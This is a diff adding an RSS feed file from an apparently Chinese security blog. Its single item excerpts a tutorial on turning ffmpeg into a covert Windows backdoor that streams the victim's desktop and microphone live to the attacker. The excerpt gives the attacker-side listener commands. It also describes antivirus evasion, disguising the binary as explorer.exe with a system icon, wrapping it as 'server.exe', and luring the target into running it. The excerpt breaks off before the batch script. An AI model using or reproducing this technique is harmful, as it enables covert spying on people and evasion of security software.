@@ -1,0 +1,38 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Windows on nowhere</title>
+    <link>https://killmonday.github.io/%E5%90%8E%E9%97%A8/windows/</link>
+    <description>Recent content in Windows on nowhere</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <copyright>2020 ownhp. All rights reserved.</copyright>
+    <lastBuildDate>Wed, 26 Feb 2020 20:45:06 +0810</lastBuildDate>
+    
+	<atom:link href="https://killmonday.github.io/%E5%90%8E%E9%97%A8/windows/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>2020免杀，ffmpeg实时监听桌面和麦克风</title>
+      <link>https://killmonday.github.io/posts/3.%E5%90%8E%E9%97%A8/ffmpeg%E5%90%8E%E9%97%A8/</link>
+      <pubDate>Wed, 26 Feb 2020 20:45:06 +0810</pubDate>
+      
+      <guid>https://killmonday.github.io/posts/3.%E5%90%8E%E9%97%A8/ffmpeg%E5%90%8E%E9%97%A8/</guid>
+      <description>1.ffmpeg是什么 FFmpeg是一个多媒体框架，能够编码、传输和播放大多数格式的文件（可运行在Windows，macOS和基于Unix的发行版系统）。它是一款可移植的独立软件，可以作为单个可执行文件运行，而无需任何安装或配置。
+利用ffmpeg，不需要远程桌面，不需要打开目标计算机的任何端口，就可以实时直播Windows10桌面和监听麦克风。
+2.实验内容   攻击者
+ 在安卓手机上  使用内网穿透软件得到可公网代理 安装ffmpeg 使用ffmpeg监听端口，以便接收受害者机器传来的视频流并保存到本地 在谷歌商店安装VLC：一款可以播放实时传输视频的APP   在PC上  对ffmpeg.exe做免杀和伪装处理，以一切手段诱使目标计算机执行      在受害者机器上
+ 执行伪装后的ffmpeg.exe，使用ffmpeg发送视频流（以UDP传输）到远程端口。    注：攻击者也可以直接使用在公网的个人服务器来接收视频流，例如VPS主机、阿里云服务器。
+3.实验过程 以下是操作步骤。
+3.1 安卓手机安装ffmpeg 攻击者在手机上的谷歌商店安装userland后，点击安装kali系统（精简版，几分钟就可以）。
+设置好root口令后，用userland自带的ssh登录工具登录到模拟的kali系统。
+ 在kali系统里安装ffmpeg：  apt-get install ffmpeg 启动ffmpeg  ffmpeg -i udp://0.0.0.0:10001 /storage/internal/livestream.avi注：路径选为自己的安卓手机安装userland后得到的共享目录，一般在kali里就是“/storage/internal”。
+至于如何在安卓文件系统里找到该共享目录，可以先在kali的该目录下创建一个文件，然后在安卓文件系统里查找该文件名，以此找到共享文件夹的位置。
+ 在谷歌商店安装VLC  略
+3.2 制作后门 WinRAR自解压程序制作   把ffmpeg.exe改名为explorer.exe，增强其在任务管理器中的迷惑性。
+如果需要更强的伪装，可以下载windows10系统的程序图标库，并给explorer.exe打上ico。
+   编写.bat批处理文件，并用&amp;quot;bat to exe converter&amp;quot;打开，生成exe文件，这里我给生成的exe文件命名为&amp;quot;server.exe&amp;rdquo;。  批处理内容：</description>
+    </item>
+    
+  </channel>
+</rss>
